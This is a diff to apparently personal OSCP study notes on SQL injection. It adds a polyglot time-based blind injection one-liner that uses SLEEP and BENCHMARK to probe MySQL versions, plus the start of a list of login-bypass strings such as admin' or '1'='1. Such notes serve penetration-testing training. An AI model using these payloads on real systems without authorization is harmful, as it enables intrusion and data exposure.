@@ -4,6 +4,16 @@ SQL Injection is a very common attack vector in the `OSCP` exam. You will most l
 
 ### Auth Bypass / SQLI Checker
 
+#### God-Tier One-Liner
+
+```txt
+// Shoutout hacktricks and https://labs.detectify.com/ethical-hacking/ultimate-sql-injection-payload/ for this one.
+
+SELECT * FROM some_table WHERE double_quotes = "IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/"
+```
+
+#### List of CMDs you could try
+
 ```txt
 ';#---                   // List pulled from 0xsyr0's github.
 admin' or '1'='1
